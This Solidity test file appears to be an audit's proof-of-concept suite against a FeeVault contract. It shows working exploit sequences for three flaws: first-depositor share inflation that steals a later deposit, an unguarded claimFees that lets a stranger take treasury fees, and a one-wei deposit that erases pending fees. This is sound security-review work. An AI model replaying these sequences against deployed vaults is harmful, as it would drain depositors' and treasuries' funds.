// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Proof} from "proof/Proof.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {FeeVault} from "../src/FeeVault.sol";

contract Token is ERC20("Asset", "AST") {
    function mint(address to, uint256 v) external { _mint(to, v); }
}

contract FeeVaultProof is Proof {
    Token asset;
    FeeVault vault;
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    address carol = address(0xCA201);
    address strategy = address(0x5747);
    address treasury = address(0x7EA5);

    function setUp() public {
        asset = new Token();
        vault = new FeeVault(asset);
        for (uint160 i = 0; i < 4; i++) {
            address u = [alice, bob, carol, strategy][i];
            asset.mint(u, 1_000e18);
            vm.prank(u);
            asset.approve(address(vault), type(uint256).max);
        }
    }

    // Issue 1: shares are priced from the raw balance, so the first depositor can mint 1 share,
    // send assets straight to the vault, and the next deposit rounds down to zero shares.
    function test_issue1_firstDepositRoundsNextDepositToZero() public {
        vm.prank(bob);
        vault.deposit(1);
        vm.prank(bob);
        asset.transfer(address(vault), 10e18);
        vm.prank(alice);
        vault.deposit(5e18);
        assertEq(vault.balanceOf(alice), 0, "alice minted no shares for 5e18");
        uint256 before = asset.balanceOf(bob);
        vm.prank(bob);
        vault.redeem(1);
        uint256 gain = asset.balanceOf(bob) - before;
        assertEq(gain, 15e18 + 1, "bob's one share redeems his donation plus alice's deposit");
        assertEq(asset.balanceOf(address(vault)), 0, "nothing left for alice");
    }

    // Issue 2: claimFees has no caller check and takes any recipient.
    function test_issue2_strangerClaimsTreasuryFees() public {
        vm.prank(alice);
        vault.deposit(100e18);
        vm.prank(strategy);
        asset.transfer(address(vault), 10e18); // yield: price 1.0 -> 1.1
        vault.chargeFee();
        assertEq(vault.fees(), 1e18, "10% of the 10e18 gain is owed to the treasury");
        uint256 before = asset.balanceOf(carol);
        vm.prank(carol);
        vault.claimFees(carol);
        assertEq(asset.balanceOf(carol) - before, 1e18, "a stranger took the treasury's fee");
        assertEq(asset.balanceOf(treasury), 0, "treasury got nothing");
        assertEq(vault.fees(), 0, "fee debt erased");
    }

    // Issue 3: deposit moves the mark up to the current price without charging the fee first,
    // so the gain since the last charge is never charged. One wei is enough.
    function test_issue3_depositWipesPendingFee() public {
        vm.prank(alice);
        vault.deposit(100e18);
        vm.prank(strategy);
        asset.transfer(address(vault), 10e18); // 10e18 gain, 1e18 fee pending
        vm.prank(bob);
        vault.deposit(1);
        vault.chargeFee();
        assertEq(vault.fees(), 0, "pending 1e18 fee is gone");
        assertEq(vault.mark(), vault.price(), "mark already at the post-yield price");
        // Alice keeps the treasury's cut: her 100e18 shares now redeem the full 110e18 (less dust).
        vm.prank(alice);
        vault.redeem(100e18);
        assertGt(asset.balanceOf(alice), 1_009e18, "alice walked out with the treasury's 1e18");
    }

    // Control for issue 3: without the deposit, the same gain is charged.
    function test_issue3_control_noDepositChargesFee() public {
        vm.prank(alice);
        vault.deposit(100e18);
        vm.prank(strategy);
        asset.transfer(address(vault), 10e18);
        vault.chargeFee();
        assertEq(vault.fees(), 1e18, "fee charged when no deposit intervenes");
    }
}
